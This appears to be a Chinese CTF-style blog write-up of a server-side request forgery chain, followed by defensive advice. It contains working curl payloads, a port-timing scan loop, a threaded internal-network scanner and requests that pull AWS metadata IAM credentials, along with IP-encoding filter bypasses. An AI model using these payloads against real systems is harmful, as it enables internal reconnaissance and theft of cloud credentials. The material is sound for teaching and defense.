---
title: SSRF：从内网探测到云元数据
date: 2026-08-30
category: 安全
tags: [CTF, Web安全, SSRF, 云安全]
excerpt: 一次完整的 SSRF 利用链复盘：绕过本地回显限制、探测内网存活主机、最终打到云厂商的元数据服务拿下临时凭证。
---

## 起点：一个「图片下载」功能

目标站点有个很常见的功能：填入图片 URL，服务端拉取并展示。

```http
POST /api/fetch-image HTTP/1.1
Content-Type: application/json

{"url": "https://example.com/cat.jpg"}
```

这种接口是 SSRF 的经典入口。先确认它能访问非预期地址：

```bash
curl -s https://target/api/fetch-image \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8080/"}'
```

返回了内网服务的 404 页面——**确认存在 SSRF，且响应会被回显**。

## 第一步：摸清解析器的能力边界

SSRF 能不能用，取决于 URL 解析器支持什么。逐一测试：

| Payload | 结果 | 说明 |
| --- | --- | --- |
| `http://127.0.0.1/` | ✅ | 基础 |
| `http://localhost/` | ✅ | DNS 解析 |
| `http://2130706433/` | ✅ | 十进制整数 IP |
| `http://0x7f000001/` | ✅ | 十六进制 |
| `http://[::1]/` | ❌ | 不支持 IPv6 |
| `file:///etc/passwd` | ❌ | 协议被白名单拦了 |
| `gopher://...` | ❌ | 同上 |

探测端口时可以观察**响应时间的差异**。这是最朴素的端口扫描：

```bash
for p in 22 80 443 3306 6379 8080 9200; do
  echo -n "$p: "
  curl -s -o /dev/null -w '%{time_total}\n' \
    -d "{\"url\":\"http://127.0.0.1:$p/\"}" \
    -H 'Content-Type: application/json' \
    https://target/api/fetch-image
done
```

*（仅用于授权测试环境）*

开放端口通常立刻返回，被防火墙丢弃的会卡到超时。

## 第二步：扫内网段

既然能探测 `127.0.0.1`，下一步就是内网其他主机。常见的私有网段：

```text
10.0.0.0/8        → 10.0.0.1   ~ 10.255.255.254
172.16.0.0/12     → 172.16.0.1  ~ 172.31.255.254
192.168.0.0/16    → 192.168.0.1 ~ 192.168.255.254
169.254.0.0/16    → link-local（云元数据常驻这里！）
```

这一段别手敲，写脚本批量跑：

```python
import requests, concurrent.futures

TARGET = "https://target/api/fetch-image"

def probe(ip):
    try:
        r = requests.post(TARGET, json={"url": f"http://{ip}:80/"},
                          timeout=3)
        return (ip, r.status_code, len(r.content))
    except Exception as e:
        return (ip, type(e).__name__, 0)

cands = [f"172.17.{i}.{j}" for i in range(0, 4) for j in range(1, 255)]

with concurrent.futures.ThreadPoolExecutor(64) as ex:
    for ip, code, size in ex.map(probe, cands):
        if code != "ConnectTimeout":
            print(f"{ip:>16}  {code}  {size}")
```

并发别开太高，容易把目标打挂，也容易被 WAF 拦。

## 第三步：直取云元数据

**这一整段只适用于你拥有授权的资产。** 在真实渗透里拿到云凭证等同于拿下整台机器，务必确认授权范围。

主流云厂商把临时凭证放在一个固定的 link-local 地址上：

| 厂商 | 地址 |
| --- | --- |
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |

第一步先确认元数据服务可达：

```bash
curl -s https://target/api/fetch-image \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

返回了 IAM 角色名，说明这条路通了。接下来取凭证：

```bash
curl -s https://target/api/fetch-image \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Reader-Role"}'
```

拿到的是一个标准的 JSON：

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA****************",
  "SecretAccessKey": "****************************************",
  "Token": "FwoGZXIvYXdzEBcaDH...",
  "Expiration": "2026-08-30T18:42:11Z"
}
```

到这里，漏洞已经从「能读个网页」升级成了「能拿到云上身份」。

## 防御：为什么黑名单没用

很多开发者的第一反应是过滤 `127.0.0.1`、`localhost`、`169.254`。这个思路会输，因为**绕过方式永远比黑名单长**：

```text
127.0.0.1        2130706433      0x7f.0.0.1
127.1            [::ffff:127.0.0.1]
localtest.me  →  解析到 127.0.0.1（公开的恶意 DNS）
spoofed.burpcollaborator.net
```

正确的做法：

1. **白名单协议**：只允许 `http`/`https`，禁掉 `file`、`gopher`、`dict`。
2. **解析后校验 IP，而不是校验域名**。这是最关键的一条——先 DNS 解析拿到 IP，再判断是否在私有网段。否则 DNS rebinding 会直接绕过。
3. **禁止重定向**，或重定向后再做一次同样的校验。
4. **统一错误响应**：不要让攻击者通过错误信息区分「端口关闭」和「主机不存在」。
5. **云上加固**：EC2 强制 IMDSv2（需要 PUT 请求拿 token，SSRF 通常拿不到），GCP 要求 `Metadata-Flavor` 头。

## 写在最后

SSRF 有意思的地方在于，它暴露的是一种**信任错位**：服务器以为自己在访问用户给的地址，实际上它在用自己的身份访问——而「自己的身份」往往比用户大得多。

内网没有边界，元数据服务没有密码。**唯一可靠的防线，是在发起请求之前就想清楚：这个地址，我真的应该去吗？**
